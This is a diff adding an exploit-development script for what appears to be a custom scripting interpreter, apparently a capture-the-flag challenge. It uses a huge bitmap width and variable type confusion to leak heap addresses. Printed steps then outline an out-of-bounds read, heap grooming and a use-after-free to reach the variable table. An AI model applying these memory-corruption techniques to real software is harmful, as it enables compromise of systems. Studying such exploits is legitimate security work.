@@ -1,0 +1,55 @@
+print("=== Find Bitmap Buffer Using OOB Read ===");
+
+print("Step 1: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Set a known pattern in bitmap");
+print("Setting bits at y=0, x=0 to x=63 (8 bytes)");
+set(b1, 0, 0, 1);
+set(b1, 1, 0, 1);
+set(b1, 2, 0, 1);
+set(b1, 3, 0, 1);
+set(b1, 4, 0, 1);
+set(b1, 5, 0, 1);
+set(b1, 6, 0, 1);
+set(b1, 7, 0, 1);
+print("Set first byte to 0xFF");
+
+print("Step 3: Leak heap addresses");
+int leak1 = 0;
+string leak1 = "marker1";
+int addr1 = leak1;
+print("Leaked address 1:");
+print(addr1);
+
+int leak2 = 0;
+string leak2 = "marker2";
+int addr2 = leak2;
+print("Leaked address 2:");
+print(addr2);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Step 4: Use OOB read to find bitmap buffer");
+print("Bitmap buffer should contain our 0xFF pattern at start");
+print("Scan memory around targetaddr to find 0xFF pattern");
+print("When found, that's likely the bitmap buffer");
+
+print("Note: This requires systematic OOB read");
+print("Or we can try reading from different y values");
+print("to see where our pattern appears");
+
+print("Step 5: Alternative - leak bitmap variable entry");
+print("Bitmap variable entry has value_ptr pointing to bitmap struct");
+print("If we can read variable entry, we get bitmap struct address");
+print("Then read bitmap struct to get data pointer");
+
+print("Step 6: Use use-after-free to read variable table");
+print("Self-assignment creates use-after-free");
+print("Groom heap to make corrupted variable point to variable table");
+print("Read entries to find bitmap entry");
+
